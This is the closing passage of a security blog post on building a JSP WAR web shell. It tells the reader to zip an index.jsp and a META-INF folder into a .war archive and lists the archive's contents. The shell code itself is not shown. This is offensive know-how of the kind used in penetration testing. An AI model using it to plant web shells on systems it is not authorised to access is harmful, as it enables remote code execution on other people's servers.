</pre></table></code></div></div><p>We then create a zip file with the <code class="language-plaintext highlighter-rouge">index.jsp</code> file and the <code class="language-plaintext highlighter-rouge">META-INF</code> folder using a tool like 7zip. The output file should be renamed so it has the <code class="language-plaintext highlighter-rouge">.war</code> extension. The contents of the war file should look like this:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>(FILE)     index.jsp
(FOLDER)   META-INF
(FILE)        MANIFEST.MF
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/categories/security/">security</a>, <a href="/categories/web/">web</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/http/" class="post-tag no-text-decoration" >http</a> <a href="/tags/https/" class="post-tag no-text-decoration" >https</a> <a href="/tags/security/" class="post-tag no-text-decoration" >security</a> <a href="/tags/jsp/" class="post-tag no-text-decoration" >jsp</a> <a href="/tags/java/" class="post-tag no-text-decoration" >java</a> <a href="/tags/war/" class="post-tag no-text-decoration" >war</a> <a href="/tags/shell/" class="post-tag no-text-decoration" >shell</a> <a href="/tags/rce/" class="post-tag no-text-decoration" >rce</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=JSP%20War%20Shell%20-%20Node%20Security&url=%2Fposts%2Fjsp-war-shell%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=JSP%20War%20Shell%20-%20Node%20Security&u=%2Fposts%2Fjsp-war-shell%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=%2Fposts%2Fjsp-war-shell%2F&text=JSP%20War%20Shell%20-%20Node%20Security" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/json-parse-and-filter/">JSON Parse & Filter</a><li class="text-truncate lh-lg"> <a href="/posts/password-word-list-generator/">Password Word List Generator</a><li class="text-truncate lh-lg"> <a href="/posts/rust-cheatsheet/">Rust Cheatsheet</a><li class="text-truncate lh-lg"> <a href="/posts/breaking-out-of-windows-environments/">Breaking out of Windows Environments</a><li class="text-truncate lh-lg"> <a href="/posts/custom-right-click-menu-option/">Windows Custom Right Click Menu Option</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/security/">security</a> <a class="post-tag btn btn-outline-primary" href="/tags/javascript/">javascript</a> <a class="post-tag btn btn-outline-primary" href="/tags/cryptography/">cryptography</a> <a class="post-tag btn btn-outline-primary" href="/tags/web/">web</a> <a class="post-tag btn btn-outline-primary" href="/tags/http/">http</a> <a class="post-tag btn btn-outline-primary" href="/tags/https/">https</a> <a class="post-tag btn btn-outline-primary" href="/tags/algorithm/">algorithm</a> <a class="post-tag btn btn-outline-primary" href="/tags/programming/">programming</a> <a class="post-tag btn btn-outline-primary" href="/tags/windows/">windows</a> <a class="post-tag btn btn-outline-primary" href="/tags/nodejs/">nodejs</a></div></section></div><section id="toc-wrapper" class="d-none ps-0 pe-4"><h2 class="panel-heading ps-3 mb-2">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/posts/cookies-ports-and-subdomains/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1643371690" data-df="ll" > Jan 28, 2022 </time><h4 class="pt-0 my-2">Cookies, Ports and Subdomains</h4><div class="text-muted"><p>This post will look at how browser cookies work when used on different subdomains and on different ports. Short Answer &amp;amp; Summary Cookie without Domain Attribute Same Domain Dif...</p></div></div></a></article><article class="col"> <a href="/posts/web-app-security/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1632898910" data-df="ll" > Sep 29, 2021 </time><h4 class="pt-0 my-2">Web App Security</h4><div class="text-muted"><p>General purpose guide for testing Web Applications. This list is not supposed to be exhaustive, nor is the information absolute. Each web application is different and the business case needs to be ...</p></div></div></a></article><article class="col"> <a href="/posts/certificate-generation-pure-nodejs/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1632146870" data-df="ll" > Sep 21, 2021 </time><h4 class="pt-0 my-2">Certificate Generate Pure NodeJS</h4><div class="text-muted"><p>This post will show example code of how to generate a Certificate Authority and Host Certificates (signed by the CA we generate) using NodeJS without using OpenSSL. This will be done using the node...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/posts/basic-ssh-&-ssh-port-forwarding/" class="btn btn-outline-primary" aria-label="Older" ><p>Basic SSH & SSH Port Forwarding</p></a> <a href="/posts/android-hooking-in-frida/" class="btn btn-outline-primary" aria-label="Newer" ><p>Android Hooking in Frida</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2025</time> <a href="https://twitter.com/todo">Alexander Wells</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.1.1" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/security/">security</a> <a class="post-tag btn btn-outline-primary" href="/tags/javascript/">javascript</a> <a class="post-tag btn btn-outline-primary" href="/tags/cryptography/">cryptography</a> <a class="post-tag btn btn-outline-primary" href="/tags/web/">web</a> <a class="post-tag btn btn-outline-primary" href="/tags/http/">http</a> <a class="post-tag btn btn-outline-primary" href="/tags/https/">https</a> <a class="post-tag btn btn-outline-primary" href="/tags/algorithm/">algorithm</a> <a class="post-tag btn btn-outline-primary" href="/tags/programming/">programming</a> <a class="post-tag btn btn-outline-primary" href="/tags/windows/">windows</a> <a class="post-tag btn btn-outline-primary" href="/tags/nodejs/">nodejs</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.29.0/dist/tocbot.min.js"></script> <script src="/assets/js/dist/post.min.js"></script> <script defer src="/app.min.js?baseurl=&register=true" ></script> <script>SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
